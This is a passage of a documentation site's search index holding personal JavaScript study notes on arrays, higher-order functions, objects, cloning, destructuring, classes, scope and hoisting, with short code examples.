Structures","text":""},{"location":"Dev/Prg/Langs/Js/#array","title":"Array","text":""},{"location":"Dev/Prg/Langs/Js/#array-definition","title":"Array Definition","text":"<ul> <li> <p>The Array object is used to store multiple values in a single variable.</p> </li> <li> <p>Arrays are iterables which means, you can iterate over them.</p> </li> </ul> <p>reference: W3S, MDN useful links: JavaScript Array Explorer</p> <p>Good for: Creating lists, e.g. shopping list, todo list, list of users(when each user in it is an object). Tip: We can have arrays with different types inside them but it is not advised because it's actually a bit of a performance issue, e.g.: <code>['apples', 3, undefined, true, () =&gt; console.log('apples')]</code></p>"},{"location":"Dev/Prg/Langs/Js/#common-operations","title":"Common Operations","text":"<ul> <li> <p>Create an Array</p> <p><code>length</code> : Sets or returns the number of elements in an array</p> <pre><code>let fruits = ['Apple', 'Banana']\n\nconsole.log(fruits.length)\n// 2\n</code></pre> </li> <li> <p>Empty Array</p> <pre><code>const list = [];\n\nconsole.log (list);\n// []\n\n// in contrast to variable than can't be empty\nlet a;\n\nconsole.log(a);\n// undefined\n</code></pre> </li> <li> <p>Access an Array item using the index position</p> <pre><code>let first = fruits[0]\n// Apple\n\nlet last = fruits[fruits.length - 1]\n// Banana\n</code></pre> <pre><code>// Array inside Array\nlet list = [['tiger', 'cat', 'bear', 'bird']]\n\nconsole.log(list[0][2])\n// bear\n</code></pre> <p><code>at()</code> : ES2022. takes an integer value and returns the item at that index, allowing for positive and negative integers. Negative integers count back from the last item in the array. Returns <code>undefined</code> if the given index can not be found.</p> <pre><code>const arr = [100, 200, 400, 50000, 10];\narr.at(-1); // as default '-1' is the last item\n// 10\narr.at(-2);\n// 50000\narr.at(0);\n// 100\n</code></pre> </li> <li> <p>Loop over an Array</p> <p><code>forEach()</code> : ES5. Calls a function for each array element</p> <p>Tip: We can define in advance the callback function of forEach and use it in all arrays in our code.</p> <pre><code>fruits.forEach((item, index, array) =&gt; console.log(item, index))\n// Apple 0\n// Banana 1\n</code></pre> </li> <li> <p>Add an item to the end of an Array</p> <p><code>push()</code> : Adds new elements to the end of an array, and returns the new length</p> <pre><code>let newLength = fruits.push('Orange') // add to the end, 'newLength' value is 3\n// [\"Apple\", \"Banana\", \"Orange\"]\n</code></pre> </li> <li> <p>Remove an item from the end of an Array</p> <p><code>pop()</code> : Removes the last element of an array, and returns that element</p> <pre><code>let last = fruits.pop() // remove Orange from the end and return it so 'last' value is 'Orange'\n// [\"Apple\", \"Banana\"]\n</code></pre> </li> <li> <p>Remove an item from the beginning of an Array</p> <p><code>shift()</code> : Removes the first element of an array, and returns that element</p> <pre><code>let first = fruits.shift() // remove Apple from the front and return it so 'first' value is 'Apple'\n// [\"Banana\"]\n</code></pre> </li> <li> <p>Add an item to the beginning of an Array</p> <p><code>unshift()</code> : Adds new elements to the beginning of an array, and returns the new length</p> <pre><code>let newLength = fruits.unshift('Strawberry') // add to the front, 'newLength' value is 2\n// [\"Strawberry\", \"Banana\"]\n</code></pre> </li> <li> <p>Find the index of an item in an Array, Find item in an Array</p> <p><code>indexOf()</code> : Search the array for an element and returns its position Returns -1 if the item is not found. If the item is present more than once, the indexOf method returns the position of the first occurence.</p> <p>Tip: this method suits for work with primitive data type. Tip: if you want to search from end to start, use the lastIndexOf() method.</p> <pre><code>fruits.push('Mango')\n// [\"Strawberry\", \"Banana\", \"Mango\"]\n\nlet pos = fruits.indexOf('Banana')\n// 1\n</code></pre> <p><code>findIndex()</code> : Returns the index of the first element in an array that pass a test(provided as a function)</p> <ul> <li> <p>ES6.</p> </li> <li> <p>Actually <code>findIndex()</code> is a loop, because it executes the function once for each element present in the array:</p> <ul> <li> <p>If it finds an array element where the function returns a true value, <code>findIndex()</code> returns the index of that array element (and does not check the remaining values)</p> </li> <li> <p>Otherwise it returns -1</p> </li> </ul> <p><code>findIndex()</code> does not execute the function for array elements without values.</p> <p><code>findIndex()</code> does not change the original array.</p> <p>Tip</p> <p>This method suits for work with objects.</p> </li> </ul> <p><code>find()</code> : Returns the value of the first element in an array that pass a test(provided as a function)</p> <ul> <li> <p>Actually <code>find()</code> is a loop, because it executes the function once for each element present in the array:</p> <ul> <li> <p>If it finds an array element where the function returns a true value, <code>find()</code> returns the value of that array element (and does not check the remaining values)</p> </li> <li> <p>Otherwise it returns undefined</p> </li> </ul> <p><code>find()</code> does not execute the function for empty arrays.</p> <p><code>find()</code> does not change the original array.</p> <p>Tip</p> <p>This method suits for work with objects.</p> </li> </ul> <pre><code>const people = [\n{name: 'Alice', budget: 4200},\n{name: 'Eva', budget: 3500},\n{name: 'Bob', budget: 1700},\n]\n\n// using findIndex:\nconst index = people.findIndex(person =&gt; person.budget === 3500);\nconsole.log(index)\n// 1\n\n// using find:\nconst person = people.find(person =&gt; person.budget === 3500);\nconsole.log(person)\n// {name: \"Eva\", budget: 3500}\n</code></pre> </li> <li> <p>Remove an item by index position</p> <p><code>splice()</code> : Adds/Removes elements from an array</p> <pre><code>let removedItem = fruits.splice(1, 1) // this is how to remove an item\n\n// [\"Strawberry\", \"Mango\"]\n</code></pre> </li> <li> <p>Remove and Add items from an index position</p> <p><code>splice()</code> : Adds/Removes elements from an array</p> <pre><code>let vegetables = ['Cabbage', 'Turnip', 'Radish', 'Carrot']\nconsole.log(vegetables)\n// [\"Cabbage\", \"Turnip\", \"Radish\", \"Carrot\"]\n\nlet pos = 1\nlet n = 2\n\nlet removedItems = vegetables.splice(pos, n, 'Cucumber', 'Potato')\n// this is how to remove items, n defines the number of items to be removed,\n// starting at the index position specified by pos and progressing toward the end of array.\n\nconsole.log(vegetables)\n// [\"Cabbage\", \"Cucumber\", \"Potato\", \"Carrot\"] (the original array is changed)\n\nconsole.log(removedItems)\n// [\"Turnip\", \"Radish\"]\n</code></pre> </li> <li> <p>Clone an Array</p> <ul> <li> <p>Shallow Clone:</p> <p><code>slice()</code> : Selects a part of an array, and returns the new array</p> <pre><code>const shallowClone = fruits.slice()\n// [\"Strawberry\", \"Mango\"]\n\n// or using concat()\nconst shallowClone2 = [].concat(fruits)\n\n// or using SPREAD operator\nconst shallowClone3 = [...fruits]\n</code></pre> </li> <li> <p>Deep Clone:</p> <p>reference: How to Deep Clone an Array in JavaScript - DEV Community</p> <ul> <li> <p>Using JSON.stringify/parse:</p> <pre><code>let nestedArray = [1, [2], 3];\nlet arrayClone = JSON.parse(JSON.stringify(nestedArray));\n\n// Make some changes\narrayClone[0] = '\ud83d\udc7b'; // change shallow element\narrayClone[1][0] = '\ud83d\udca9'; // change nested element\nconsole.log(arrayClone); // [ '\ud83d\udc7b', [ '\ud83d\udca9' ], 3 ]\n\n// \u2705 Nested array NOT affected\nconsole.log(nestedArray); //  [1, [ 2 ], 3 ]\n</code></pre> <p>It doesn't work with values not compatible with JSON.</p> <p>It only work with Number, String and Object literal without function or symbol properties.</p> </li> <li> <p>Using <code>_.cloneDeep(value)</code> Lodash library method</p> <pre><code>var objects = [{ 'a': 1 }, { 'b': 2 }];\n\nvar deep = _.cloneDeep(objects);\nconsole.log(deep[0] === objects[0]);\n// =&gt; false\n</code></pre> </li> <li> <p>Using recursion</p> <pre><code>const clone = items =&gt; items.map(item =&gt; Array.isArray(item) ? clone(item) : item);\n</code></pre> </li> </ul> </li> </ul> </li> <li> <p>Join Arrays</p> <p><code>concat()</code> : Joins two or more arrays, and returns a copy of the joined arrays</p> <pre><code>let joinedArray = fruits.concat(['Apple', 'Banana'])\n// [\"Strawberry\", \"Mango\", \"Apple\", \"Banana\"]\n</code></pre> </li> <li> <p>Sort an Array</p> <p><code>sort()</code> : Sorts the elements of an array</p> <p>Syntax: array.sort(compareFunction)</p> <p>The sort order can be either alphabetic or numeric, and either ascending (up) or descending (down).</p> <p>By default, the sort() method sorts the values as strings in alphabetical and ascending order.</p> <pre><code>let fruits = [\"Banana\", \"Orange\", \"Apple\", \"Mango\"];\nfruits.sort();\n// [\"Apple\", \"Banana\", \"Mango\", \"Orange\"]\n\n// Using compareFunction:\n// Sort numbers in an array in ascending order:\nlet points = [40, 100, 1, 5, 25, 10];\npoints.sort((a, b) =&gt; a-b);\n// [1, 5, 10, 25, 40, 100]\n\n// Sort numbers in an array in descending order:\nlet points = [40, 100, 1, 5, 25, 10];\npoints.sort((a, b) =&gt; b-a);\n// [100, 40, 25, 10, 5, 1]\n</code></pre> </li> <li> <p>Split string, Reverse elements in Array, Join elements in Array</p> <p><code>split()</code> : Splits a string into an array of substrings</p> <p><code>reverse()</code> : Reverses the order of the elements in an array</p> <p><code>join()</code> : Joins all elements of an array into a string. Elements separated by comma <code>,</code>(default separator).</p> <pre><code>// Reverse string exersise:\nconst text = 'Hello, we learning JavaScript';\nconst reverseText = text.split('').reverse().join('');\nconsole.log(reverseText);\n// tpircSavaJ gninrael ew ,olleH\n</code></pre> </li> <li> <p>Check if an array contains the specified element</p> <p><code>includes()</code> :  Check if an array contains the specified element</p> <p>ES7.</p> <p>Returns true if the array contains the element, and false if not.</p> <p>Note</p> <p>The includes() method is case sensitive.</p> <pre><code>const fruits = [\"Banana\", \"Orange\", \"Apple\", \"Mango\"];\nlet n = fruits.includes(\"Mango\"); //true\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#hier-order-functions","title":"Hier Order Functions","text":"<ul> <li> <p>Map, Filter, Reduce</p> <p><code>array.map(num =&gt; {})</code>: For each element num in the array, executes actions inside <code>{}</code> and return needs to be specified since the return will be placed in a new array.</p> <p>Used for: arrays where we want to alter the arrays elements like adding a exclamation mark to a string.</p> <pre><code>const array = [1, 2, 10, 16];\n\nconst mapArray = array.map(num =&gt; num * 2);\nconsole.log(mapArray); // [2, 4, 20, 32]\n</code></pre> <pre><code>//Exercise: Create a new list with all user information, but add \"!\" to the end of each items they own.\n\nconst array = [\n{\nusername: \"john\",\nteam: \"red\",\nscore: 5,\nitems: [\"ball\", \"book\", \"pen\"]\n},\n{\nusername: \"becky\",\nteam: \"blue\",\nscore: 10,\nitems: [\"tape\", \"backpack\", \"pen\"]\n},\n{\nusername: \"susy\",\nteam: \"red\",\nscore: 55,\nitems: [\"ball\", \"eraser\", \"pen\"]\n},\n{\nusername: \"tyson\",\nteam: \"green\",\nscore: 1,\nitems: [\"book\", \"pen\"]\n},\n\n];\n\n// Wrong solution:\n// It copies \"items\" arrays instead of cloning them.\n// So in the new \"answer\" array \"items\" arrays actually passed by reference now, instead of being independed copies.\nconst answer = array.map(user =&gt; {\nuser.items = user.items.map(item =&gt; item + '!');\nreturn user;\n});\nconsole.log(answer);\n\n// Right solution 1:\nconst answer = array.map(user =&gt; {\nconst { items } = user;  // Destructuring is used here\nreturn Object.assign({}, user, { items: items.map(item =&gt; item + \"!\")})\n});\nconsole.log(answer);\n\n// Right solution 2:\nconst answer = array.map(object =&gt; {\nreturn {...object, items: object.items.map(item =&gt; `${item}!`)}\n});\nconsole.log(answer);\n</code></pre> <p>Note</p> <p>Map function always returns an array of the same size that of the parent array, unlike filter. For more read this blog post about how map function is implemented: Implementing our own Array.map() method in javascript.</p> <pre><code>// Usnig map:\n[1, 2, 3, 4, 5, 6].map(num =&gt; {\nif (num &gt; 1) return num;\n});\n// [undefined, 2, 3, 4, 5, 6]\n\n// Using filter:\n[1, 2, 3, 4, 5, 6].filter(num =&gt; num &gt; 1);\n// [2, 3, 4, 5, 6]\n</code></pre> <p><code>array.filter(num =&gt; {})</code>: For each element num of the array a condition is checked. If the value turns out true, it will be added to the new array. If none of the elements meet the condition, it will return an empty array. Return needs to be specified.</p> <p>Used for: filtering out elements which match the condition we defined.</p> <pre><code>const array = [1, 2, 10, 16];\n\nconst filterArray = array.filter(num =&gt; num &gt; 5);\nconsole.log(filterArray); // [10, 16]\n\nconst filterArray2 = array.filter(num =&gt; num === 5);\nconsole.log(filterArray2); // []\n</code></pre> <p><code>array.reduce((accumulator,num) =&gt; {}, param3)</code>: Acumulates values of the operation performed in previous elements, param3 being the initial value of the acumulator.</p> <p>Used for: arrays which we want to result in one value. Like a total sum of a array of numbers or if we want to concatenate elements from a array.</p> <p>reference: A real world usage example</p> <pre><code>const array = [1, 2, 10, 16];\n\nconst reduceArray = array.reduce((acc, num) =&gt; acc + num, 0);\nconsole.log(reduceArray); // 29\nconst reduceArray2 = array.reduce((acc, num) =&gt; acc + num, 5);\nconsole.log(reduceArray2); // 34\n</code></pre> </li> <li> <p>flat, flatMap</p> <p><code>array.flat(param1)</code>: Creates a new array with all sub-array elements concatenated into it recursively up to the param1 depth. The flat method removes empty slots(array holes) in arrays</p> <pre><code>const arr1 = [0, 1, 2, [3, 4]];\narr1.flat();\n// [0, 1, 2, 3, 4]\n\nconst arr2 = [0, 1, 2, [[[3, 4]]]];\narr2.flat(2);\n// [0, 1, 2, [3, 4]]\n\nconst arr3 = [[[[[[[[[[[[[[[[[[[[[[[[[[3]]]]]]]]]]]]]]]]]]]]]]]]]];\narr3.flat(Infinity);\n// [3]\n\nconst arr5 = [1, 2, , 4, 5];\narr5.flat();\n// [1, 2, 4, 5]\n</code></pre> <p><code>array.flatMap(param1=&gt;{})</code>: Returns a new array formed by applying a given callback function to each element of the array, and then flattening the result by one level. It is identical to a <code>map()</code> followed by a <code>flat()</code> of depth 1, but slightly more efficient than calling those two methods separately.</p> <pre><code>let arr1 = [1, 2, 3, 4];\n\narr1.map(x =&gt; [x * 2]);\n// [[2], [4], [6], [8]]\n\narr1.flatMap(x =&gt; [x * 2]);\n// [2, 4, 6, 8]\n\n// only one level is flattened\narr1.flatMap(x =&gt; [[x * 2]]);\n// [[2], [4], [6], [8]]\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#object","title":"Object","text":""},{"location":"Dev/Prg/Langs/Js/#object-definition","title":"Object Definition","text":"<ul> <li> <p>Variables are containers for data values. Objects are variables too. But objects can contain many values.</p> </li> <li> <p>Objects are enumerables which means, you can't loop over them out of the box with array methods.</p> </li> </ul> <p>Good for: storing information e.g. user info.</p> <p>useful links: JavaScript Object Explorer</p>"},{"location":"Dev/Prg/Langs/Js/#object-basics","title":"Object Basics","text":"<ul> <li> <p>Create an Object</p> <pre><code>const user = {\nname: 'John',\nage: 34,\nhobby: 'Soccer',\nisMarried: false,\nspells: ['abrakadabra', 'shazam', 'boo'],\nshout() {\nconsole.log('AHHHH!')\n}\n};\n</code></pre> </li> <li> <p>Function inside an object called method</p> <pre><code>var obj = {\nthisIsAMethod: function() {\n\n}\n}\n\nobj.thisIsAMethod() // to access the method\n</code></pre> </li> <li> <p>Empty Object</p> <pre><code>const user = {};\nconsole.log (user);    // {}\n\n// in contrast to variable that can't be empty\nlet a;\nconsole.log(a);    // undefined\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#common-object-methods","title":"Common Object Methods","text":"<ul> <li> <p><code>Object.keys()</code>(deprecated): method returns an array(whose elements are strings) of a given object's own enumerable property names, iterated in the same order that a normal loop would.</p> <pre><code>const object1 = {\na: 'somestring',\nb: 42,\nc: false\n};\n\nconsole.log(Object.keys(object1));\n// expected output: Array [\"a\", \"b\", \"c\"]\n</code></pre> <p>Usage example:</p> <pre><code>const obj = {\nusername0: 'Sanata',\nusername1: 'Rudolf',\nusername2: 'Mr. Grinch',\n}\n\nObject.keys(obj).forEach((key, index) =&gt; {\nconsole.log(key, obj[key]);\n})\n\n/* username0 Sanata\n   username1 Rudolf\n   username2 Mr. Grinch */\n</code></pre> </li> <li> <p><code>Object.values()</code>: returns an array of a given object's own enumerable property values, in the same order as that provided by a <code>for...in</code> loop. (The only difference is that a <code>for...in</code> loop enumerates properties in the prototype chain as well.) The ordering of the properties is the same as that given by looping over the property values of the object manually.</p> <pre><code>const object1 = {\na: 'somestring',\nb: 42,\nc: false\n};\n\nconsole.log(Object.values(object1));\n// expected output: Array [\"somestring\", 42, false]\n</code></pre> </li> <li> <p><code>Object.entries()</code>: returns an array of a given object's own enumerable string-keyed property <code>[key, value]</code> pairs, in the same order as that provided by a <code>for...in</code> loop. (The only important difference is that a <code>for...in</code> loop enumerates properties in the prototype chain as well). The ordering of the properties is the same as that given by looping over the property values of the object manually.</p> <p>Note</p> <p>The order of the array returned by <code>Object.entries()</code> does not depend on how an object is defined. If there is a need for certain ordering, then the array should be sorted first, like: <code>Object.entries(obj).sort((a, b) =&gt; b[0].localeCompare(a[0]));</code></p> <pre><code>const object1 = {\na: 'somestring',\nb: 42\n};\n\nconsole.log(Object.entries(object1));\n// [[\"a\", \"somestring\"], [\"b\", 42]]\n\nfor (const [key, value] of Object.entries(object1)) {\nconsole.log(`${key}: ${value}`);\n}\n\n// expected output(order is not guaranteed!):\n// \"a: somestring\"\n// \"b: 42\"\n</code></pre> <p>Usage Example:</p> <pre><code>const obj = {\nusername0: 'Santa',\nusername1: 'Rudolf',\nusername2: 'Mr. Grinch',\n}\n\nObject.entries(obj).map(value =&gt; {\nreturn value[1] + value[0].replace('username','');\n})\n// [\"Santa0\", \"Rudolf1\", \"Mr. Grinch2\"]\n</code></pre> </li> <li> <p><code>Object.fromEntries()</code>: transforms a list of key-value pairs into an object, making the first element of the list the property and the second the value of such property.</p> <pre><code>const entries = new Map([\n['foo', 'bar'],\n['baz', 42]\n]);\n\nconst obj = Object.fromEntries(entries);\nconsole.log(obj);\n// expected output: Object { foo: \"bar\", baz: 42 }\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#object-cloning","title":"Object Cloning","text":"<ul> <li> <p>Shallow Clone</p> <p>Shallow means that only the actual object gets copied. If the copied object contains nested objects \u2014 these nested objects aren't get cloned.</p> <p>reference: 3 Ways to Shallow Clone Objects in JavaScript (w/ bonuses)</p> <ul> <li> <p>Using <code>Object.assign</code></p> <p><code>Object.assign(param1,param2)</code>: clones the elements of an object param2 in an object param1.</p> <pre><code>const obj = {a: 'a', b: 'b', c: 'c'};\nconst clone = Object.assign({}, obj);\n</code></pre> </li> <li> <p>Using SPREAD Operator</p> <p><code>...</code>: allows iterables( arrays / objects / strings ) to be expanded into single arguments/elements.</p> <pre><code>const obj = {a: 'a', b: 'b', c: 'c'};\nconst clone = {...obj};\n</code></pre> </li> <li> <p>Using REST Parameter</p> <p><code>...</code>: collects all remaining elements into an array.</p> <pre><code>const obj = {a: 'a', b: 'b', c: 'c'};\nconst { ...clone } = obj;\n</code></pre> <p>Note</p> <p>Rest/Spread Operator: The rest operator which is the same as the spread operator is a powerful syntactic sugar. Combined with object destructuring it means, I don't care about the other property names. Just push everything else into a variable which is called rest which has all other properties.</p> </li> </ul> </li> <li> <p>Deep Clone</p> <ul> <li> <p>Using JSON.stringify/parse</p> <pre><code>const obj = {\na: 'a',\nb: 'b',\nc: {\ndeep: 'try and copy me',\n}\n};\n\nconst clone = JSON.parse(JSON.stringify(obj));\n</code></pre> <p>It doesn't work with values not compatible with JSON.</p> <p>It only work with Number, String and Object literal without function or symbol properties.</p> </li> <li> <p>Using recursion</p> <pre><code>// working for arrays only\nconst clone = items =&gt; items.map(item =&gt; Array.isArray(item) ? clone(item) : item);\n</code></pre> </li> </ul> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#destructuring-assignment","title":"Destructuring assignment","text":"<p>MDN</p> <ul> <li> <p><code>const(/let) {property1, property2,...} = obj</code>: given an object obj, keeps the value of the properties in new variables property1, property2,...etc</p> <pre><code>const obj = {\nplayer: 'bobby',\nexperience: 100,\nwizardLevel: false,\nage: undefined\n}\n\n// accessing properties without distructuring:\nconst player = obj.player;\nconst experience = obj.experience;\nconst playerAge = obj.age;  // playerAge:undefined\nlet wizardLevel = obj.wizardLevel;\n\n// accessing properties using distructuring:\nconst { player, experience, age: playerAge = 30 } = obj; // age:undefined --&gt; playerAge: 30 (here property name changed + default value assigned(it is possible only when object property value is `undefined`))\nlet { wizardLevel } = obj;\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#dynamic-property-names","title":"Dynamic property names","text":"<ul> <li> <p>ES6.</p> </li> <li> <p>Declaring properties using <code>[]</code></p> <pre><code>const name = 'john snow';\n\nconst obj = {\n[name]: 'hello',\n['ray' + ' ' + 'smith']: 'hihi',\n[1 + 2]: 'hihi'\n}\n\nconsole.log(obj); // { 3: \"hihi\", \"john snow\": \"hello\", \"ray smith\": \"hihi\" }\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#property-declaration-shortcut","title":"Property declaration shortcut","text":"<ul> <li> <p>ES6.</p> </li> <li> <p>When 'property name' = 'value' we can use following syntax:</p> <p><code>object { property name that is the value of the beforehand declared variable name that matches it }</code></p> <pre><code>const a = \"Simon\";\nconst b = true;\nconst c = {};\n\n// the old way\nconst obj = {\na: a,\nb: b,\nc: c\n}\n\n// the new way\nconst obj = {\na,\nb,\nc\n}\n\nconsole.log(obj); // {a: 'Simon', b: true, c: {\u2026}}\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#context-this-keyword","title":"Context, <code>this</code> keyword","text":"<ul> <li> <p>Context tells you, where we are within the object, i.e. what is the object environment that we're in right now.</p> </li> <li> <p><code>this</code> refers to what object it's inside of. If the object \u201cfoo\u201d has a method called \u201cbar\u201d, when the JavaScript keyword <code>this</code> is used inside of \u201cbar\u201d, it refers to \u201cfoo\u201d. If the function \u201cbar\u201d were executed in the global scope, then <code>this</code> refers to the window object (except in strict mode).</p> <pre><code>function a() {\nconsole.log(this);\n}\na(); // Window {...}\n\nconst object = {\nb: function() {\nconsole.log(this);\n}\n}\nobject.b(); // {b: f}\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#instantiation","title":"Instantiation(\u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u044d\u043a\u0437\u0435\u043c\u043f\u043b\u044f\u0440\u043e\u0432)","text":"<p>reference: MDN: Inheritance in JavaScript</p> <ul> <li> <p>ES6.</p> </li> <li> <p>Making instances(\u044d\u043a\u0437\u0435\u043c\u043f\u043b\u044f\u0440\u044b) or multiple copies of an object using <code>class</code>.</p> </li> <li> <p>We utilize a class when we are planning to create several objects with similar properties.</p> </li> <li> <p>A class extention is used when those several objects can contain properties or categories with specific properties and methods, while respecting the initial constructor.</p> </li> <li> <p>Class Creator syntax:</p> <pre><code>class Classname {\nconstructor(param1,param2) {\nthis.param1 = value1;\nthis.param2 = value2;\n}\nclassmethod(){\n}\n}\n</code></pre> </li> <li> <p>Class Extention syntax:</p> <pre><code>class Classextension extends Classname {\nconstructor(param1,param2) {\nsuper(param1,param2);\n}\nclassextensionmethod(){\n}\n}\n</code></pre> <p>super() -  is a javscript function which gets used with the class pattern. That means, calling <code>super()</code> inside of the constructor with no arguments will just initialize the class and if you have arguments in the super function, you can use these arguments also in the constructor itself.</p> </li> <li> <p>Create Object from the Class syntax:</p> <pre><code>new Classname(param1,param2)\n</code></pre> </li> <li> <p>Example:</p> <pre><code>class Player {\n// a class must have a constructor\nconstructor(name, type) {\nconsole.log(this, \"from the Player class\");  // Wizard {} - this will be result of `new Wizard` wich in turn calls Player constructor.\nthis.name = name;\nthis.type = type;\n}\nintroduce() {\nconsole.log(`Hi I am ${this.name}, I am a ${this.type}`);\n}\n}\n\nclass Wizard extends Player {\n// here we also add the `spell` extra property with default value to our new exteneded class\nconstructor(name, type, spell=\"none\") {\n/* the `super` method is for passing the parameters to the parent class\n        constructor (from which we are extending from) by calling the constractor of\n        the parent class so we can work with the properties of the parent class */\nsuper(name, type);\nthis.spell = spell;\nconsole.log(this, \"from the Wizard class\");  // Wizard {name: \"Shelly\", type: \"Healer\", spell: \"Healing\"} - this will be result of `new Wizard`. Can only call this after `super`.\n}\nplay() {\nconsole.log(`WEEEEEEE I'm a ${this.type}, and my spell is: ${this.spell}.`);\n}\n}\n\nconst wizard1 = new Wizard('Shelly', 'Healer', 'Healing');\n</code></pre> <pre><code>// Classical Inheritannce(before ES6 `class` was introduced):\nvar Player = function(name, type) {\nthis.name = name;\nthis.type = type;\n}\n\nPlayer.prototype.introduce = function() {\nconsole.log(`Hi I am ${this.name}, I am a ${this.type}`);\n}\n\nvar wizard1 = new Player('Shelly', 'Healer');\n\nwizard1.play = function() {\nconsole.log(`WEEEEEEE I'm a ${this.type}`);\n}\n</code></pre> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#keywords","title":"Keywords","text":"<p><code>break</code></p> <p><code>case</code></p> <p><code>catch</code></p> <p><code>class</code></p> <p><code>const</code></p> <p><code>continue</code></p> <p><code>debugger</code>: stops running the code and opens console for a step by step check.</p> <p><code>default</code></p> <p><code>delete</code></p> <p><code>do</code></p> <p><code>else</code></p> <p><code>export</code></p> <p><code>extends</code></p> <p><code>finally</code></p> <p><code>for</code></p> <p><code>function</code></p> <p><code>if</code></p> <p><code>import</code></p> <p><code>in</code></p> <p><code>instanceof</code></p> <p><code>new</code></p> <p><code>return</code></p> <p><code>super</code></p> <p><code>switch</code></p> <p><code>this</code></p> <p><code>throw</code></p> <p><code>try</code></p> <p><code>typeof</code></p> <p><code>var</code></p> <p><code>void</code></p> <p><code>while</code></p> <p><code>with</code></p> <p><code>yield</code></p>"},{"location":"Dev/Prg/Langs/Js/#js-terms-concepts","title":"Js Terms &amp; Concepts","text":""},{"location":"Dev/Prg/Langs/Js/#expression","title":"Expression","text":"<ul> <li>Something that denotes/produces a value</li> <li>We end 'expressions' with semicolon <code>;</code> that denotes the end of the expression.</li> </ul> <pre><code>1+3;\nlet a = 2;\nreturn true;\n</code></pre>"},{"location":"Dev/Prg/Langs/Js/#scope","title":"Scope","text":"<p>reference: YT Video 1, YT Video 2</p> <p>Translation: \u0441\u0444\u0435\u0440\u0430 \u043f\u0440\u0438\u043c\u0435\u043d\u0435\u043d\u0438\u044f, \u043e\u0431\u043b\u0430\u0441\u0442\u044c \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f, \u043e\u0431\u043b\u0430\u0441\u0442\u044c \u0432\u0438\u0434\u0438\u043c\u043e\u0441\u0442\u0438</p> <ul> <li> <p>Scope has to do with the the visibility of variables i.e. variable access: what variables do I have access to when a code is running.</p> </li> <li> <p>Root Scope is the window object and this is the default scope in which is our code.</p> <pre><code>function aa() {\nconsole.log('test');\n}\nwindow.aa(); // test\n</code></pre> </li> <li> <p>Child Scope</p> <ul> <li> <p>Function-level scope</p> <p>Note</p> <p>This is different from languages like C, C++, C#, or Java. They has block-level scope.</p> <ul> <li> <p>Achieved through the use of functions.</p> </li> <li> <p>The variable declared inside of a function is private to the function, and cannot be seen outside of that function.</p> <pre><code>function bb() {\nvar a = 'hello';\n}\nconsole.log(a);\n// Uncaught ReferenceError: a is not defined\n\n// to get variable 'a':\nfunction bb() {\nvar a = 'hello';\nconsole.log(a);\n};\nbb(); // hello\n</code></pre> </li> <li> <p>Functions have access to any variable in the root scope, i.e. they can access the global variable inside of a function and mutate it.</p> </li> <li> <p>Functions can \u201csee\u201d variables that are declared inside of them. They can also \u201csee\u201d any that are declared outside of them (and those variables said to be in-scope), but never those declared inside of functions that are nested in them.</p> <pre><code>// Accessing the global variable:\nvar b = 'Can I access this?';\n\nfunction bb() {\nconsole.log(b);\n};\nbb(); // Can I access this?\n\n// Mutating the global variable:\nvar b = 'Can I access this?';\n\nfunction bb() {\nb = 'hello';\n};\nbb();\nconsole.log(b); // hello\n</code></pre> </li> <li> <p>When we declare varibale(using <code>var</code>, <code>const</code> or <code>let</code>) in child scope with the same name as existing parent scope variable, we won't have access to the parent scope variable inside child scope anymore and this is called naming conflict.</p> <pre><code>// Root Scope(window):\nvar fun = 5;\n\nfunction funFunction() {\n//Child Scope:\nvar fun = 'hellooo';\nconsole.log(fun);\n}\n\n// Naming conflict:\nfunFunction(); // hellooo\nconsole.log(fun); // 5\n</code></pre> </li> </ul> </li> <li> <p>Block-level scope</p> <ul> <li>Achieved through the use of block statements together with <code>let</code> or <code>const</code> keywords inside them.</li> </ul> </li> </ul> </li> </ul>"},{"location":"Dev/Prg/Langs/Js/#hoisting","title":"Hoisting","text":"<p>reference: W3S, JavaScript Scoping and Hoisting, Function Declarations vs. Function Expressions, </p> <p>Hoisting is JavaScript's default behavior of moving all declarations to the top of the current scope (to the top of the current script or the current function). Variable Declarations and Function Declarations are always moved (\u2018hoisted\u2019) to the top of their JavaScript scope by the JavaScript interpreter. JavaScript only hoists declarations, not initializations.</p>"},{"location":"Dev/Prg/Langs/Js/#variable-declaration-hoisting","title":"Variable Declaration Hoisting","text":"<p>Tip</p> <p>To avoid bugs, always declare all variables at the beginning of every scope. Since this is how JavaScript interprets the code, it is always a good rule.</p> <p>The <code>var</code> keyword:</p> <ul> <li> <p>In the example below: when we re-declare the <code>fun</code> variable in line 8 (<code>var fun = 20;</code>) after assigning a new value in line 6 (<code>fun = 10;</code>), the new var declaration in line 5 (caused by interpreter's hoisting mechanism) will override the reference inside of the function scope and the root <code>var fun</code>defined in line 1 is like we never touched it.</p> <pre><code>var fun = 5;\n\nfunction funFunction() {\n// hoisting happens here\n// var fun;       &lt;-- This code gets added here by javascript interpreter. We will never see it, but this happens.\nfun = 10;\nconsole.log(fun); // The 'fun' variable here is function scoped beacuse of 'var' keyword that declared it in line 8. Without the 'var' keyword there was only an assignment to the global soped 'fun' variable('fun = 20')\nvar fun = 20;     // fun = 20; &lt;-- Instead, this code actually generated here by javascript interpreter. We will never see it, but this happens.\nconsole.log(fun); // The 'fun' variable here is function scoped beacuse of 'var' keyword that declared it in line 8. Without the 'var' keyword there was only an assignment to the global soped 'fun' variable('fun = 20')\n}\n\nconsole.log(fun); //5\nfunFunction(); //10, 20\nconsole.log(fun); //5\n</code></pre> </li> </ul> <p>The <code>let</code> and <code>const</code> keywords:</p> <ul> <li> <p>Variables defined with <code>let</code> and <code>const</code> are hoisted to the top of the block, but not initialized. Meaning: The block of code is aware of the variable, but it cannot be used until it has been declared.</p> </li> <li> <p>Using a <code>let</code> variable before it is declared will result in a 